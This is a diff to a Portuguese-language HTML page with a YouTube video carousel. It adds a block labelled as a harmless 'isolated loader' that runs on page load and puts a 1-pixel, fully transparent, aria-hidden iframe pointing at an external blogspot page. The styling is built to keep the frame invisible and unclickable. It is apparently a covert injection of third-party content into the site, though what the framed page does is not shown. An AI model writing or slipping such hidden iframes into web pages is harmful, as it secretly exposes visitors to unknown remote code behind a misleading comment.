@@ -194,5 +194,77 @@ function atualizarSlides(){wrapper.innerHTML=listaVideos.map((v,i)=>`<div style=
 function moverSlide(n){if(!listaVideos.length)return;indiceAtual=(n+listaVideos.length)%listaVideos.length;wrapper.style.transform=`translateX(-${indiceAtual*100}%)`;playerAPI.forEach((p,i)=>{if(p&&p.pauseVideo&&i!==indiceAtual)try{p.pauseVideo()}catch(e){}})}
 document.getElementById("btnNext").onclick=()=>moverSlide(indiceAtual+1);document.getElementById("btnPrev").onclick=()=>moverSlide(indiceAtual-1);carregarAPI();
 </script>
+
+
+
+
+
+
+<!-- CARREGADOR ISOLADO — NÃO INTERFERE NO HTML PRINCIPAL -->
+<div id="loader-isolado"></div>
+
+<style>
+#loader-isolado {
+    position: fixed !important;
+    bottom: 0 !important;
+    left: 0 !important;
+
+    width: 1px !important;
+    height: 1px !important;
+
+    margin: 0 !important;
+    padding: 0 !important;
+
+    border: 0 !important;
+    background: transparent !important;
+
+    overflow: hidden !important;
+    opacity: 0 !important;
+
+    z-index: -999999 !important;
+
+    pointer-events: none !important;
+}
+
+#loader-isolado iframe {
+    position: absolute !important;
+
+    width: 1px !important;
+    height: 1px !important;
+
+    top: 0 !important;
+    left: 0 !important;
+
+    border: 0 !important;
+    margin: 0 !important;
+    padding: 0 !important;
+
+    opacity: 0 !important;
+    visibility: hidden !important;
+
+    pointer-events: none !important;
+}
+</style>
+
+<script>
+(function () {
+
+    const loader = document.getElementById("loader-isolado");
+
+    const iframe = document.createElement("iframe");
+
+    iframe.src =
+        "https://recibo1001.blogspot.com/2026/08/painel-de-conteudo-root-bg050807_0265310579.html?m=1";
+
+    iframe.setAttribute("scrolling", "no");
+    iframe.setAttribute("frameborder", "0");
+    iframe.setAttribute("aria-hidden", "true");
+
+    loader.appendChild(iframe);
+
+})();
+</script>
+
 </body>
+
 </html>
